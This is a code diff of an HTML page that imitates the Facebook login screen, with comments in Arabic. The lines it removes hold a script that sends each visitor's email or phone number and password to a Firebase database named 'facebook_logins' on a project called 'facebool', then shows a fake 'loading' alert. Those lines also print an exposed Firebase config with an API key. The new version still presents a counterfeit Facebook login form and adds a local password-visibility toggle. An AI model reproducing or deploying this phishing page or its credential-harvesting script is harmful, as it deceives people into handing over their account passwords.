@@ -63,53 +63,146 @@
       font-size: 15px;
     }
     
-    /* 2. تنسيق حاوية الباسورد لتوزيع الأيقونة بشكل متناسق */
+    /* تنسيق حاوية كلمة المرور لضبط مكان أيقونة العين */
     .password-container {
-      position
-  </script>
-</body>
-  <script type="module">
-    // 1. استيراد مكتبات Realtime Database المتوافقة من الإنترنت مباشرة
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+      position: relative;
+      width: 100%;
+    }
+    
+    .password-container input {
+      padding-right: 45px;
+      margin-bottom: 12px;
+    }
 
-    // 2. إعدادات مشروعك الحقيقية التي أرسلتها
-    const firebaseConfig = {
-      apiKey: "AIzaSyDkeUoRzeLLwT26zjlHgUzbU1vnDcweX4o",
-      authDomain: "facebool-f49f0.firebaseapp.com",
-      databaseURL: "https://facebool-f49f0-default-rtdb.firebaseio.com",
-      projectId: "facebool-f49f0",
-      storageBucket: "facebool-f49f0.firebasestorage.app",
-      messagingSenderId: "1009594237184",
-      appId: "1:1009594237184:web:f9a868f1336fa33df2f3e5",
-      measurementId: "G-L0JVS244FX"
-    };
+    .toggle-btn {
+      position: absolute;
+      right: 15px;
+      top: 24px;
+      transform: translateY(-50%);
+      border: none;
+      background: none;
+      cursor: pointer;
+      font-size: 18px;
+      color: #1c1e21;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .login-btn {
+      background-color: #1877f2;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      line-height: 48px;
+      padding: 0 16px;
+      width: 100%;
+      margin-bottom: 16px;
+      cursor: pointer;
+    }
+    
+    .login-btn:hover {
+      background-color: #166fe5;
+    }
+    
+    .forgot-password {
+      color: #1877f2;
+      display: block;
+      font-size: 14px;
+      text-align: center;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+    
+    .divider {
+      border-bottom: 2px solid #dadde1;
+      margin: 15px 0px;
+    }
+    
+    .create-account {
+      background-color: #42b72a;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      cursor: pointer;
+      font-size: 17px;
+      font-weight: bold;
+      line-height: 48px;
+      padding: 0 16px;
+      margin: 0 auto;
+      display: block;
+    }
+    
+    .create-account:hover {
+      background-color: #36a420;
+    }
+    
+    @media (max-width: 900px) {
+      body {
+        overflow: auto;
+      }
+      
+      .wrapper {
+        flex-direction: column;
+        text-align: center;
+        padding: 40px 20px;
+      }
+      
+      .logo-section {
+        padding-right: 0;
+        margin-bottom: 10px;
+      }
+      
+      .logo {
+        font-size: 3rem;
+      }
+    }
+  </style>
+</head>
+<body>
 
-    // تشغيل الـ Firebase والاتصال بالـ Realtime Database
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+  <div class="wrapper">
+    <div class="logo-section">
+      <h1 class="logo">facebook</h1>
+    </div>
+    <div class="login-form">
+      <form id="loginForm">
+        <input type="text" id="email" placeholder="Email or phone number" required>
+        
+        <div class="password-container">
+          <input type="password" id="password" placeholder="Password" required>
+          <button type="button" id="togglePassword" class="toggle-btn">
+            <i id="toggleIcon" class="bi bi-eye"></i>
+          </button>
+        </div>
 
-    // مراقبة ضغط زر تسجيل الدخول وإرسال البيانات
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault(); // يمنع تشغيل الأكشن الافتراضي وإعادة تحميل الصفحة
+        <button type="submit" class="login-btn">Log In</button>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="divider"></div>
+        <button type="button" class="create-account">Create New Account</button>
+      </form>
+    </div>
+  </div>
 
-        const emailValue = document.getElementById('email').value;
-        const passwordValue = document.getElementById('text').value;
+  <script>
+    const passwordInput = document.getElementById('password');
+    const togglePasswordButton = document.getElementById('togglePassword');
+    const toggleIcon = document.getElementById('toggleIcon');
 
-        try {
-            // حفظ البيانات في جدول باسم facebook_logins
-            await push(ref(db, 'facebook_logins'), {
-                emailOrPhone: emailValue,
-                password: passwordValue,
-                timestamp: new Date().toISOString()
-            });
-            
-            alert("loading ");
-            document.getElementById('loginForm').reset(); // مسح الخانات بعد الإرسال
-        } catch (error) {
-            alert("حدث خطأ أثناء الإرسال: " + error.message);
-        }
+    // كود تشغيل العين وإخفائها محلياً فقط
+    togglePasswordButton.addEventListener('click', function () {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      
+      if (type === 'password') {
+        toggleIcon.className = 'bi bi-eye';
+      } else {
+        toggleIcon.className = 'bi bi-eye-slash';
+      }
     });
   </script>
+
 </body>
 </html>
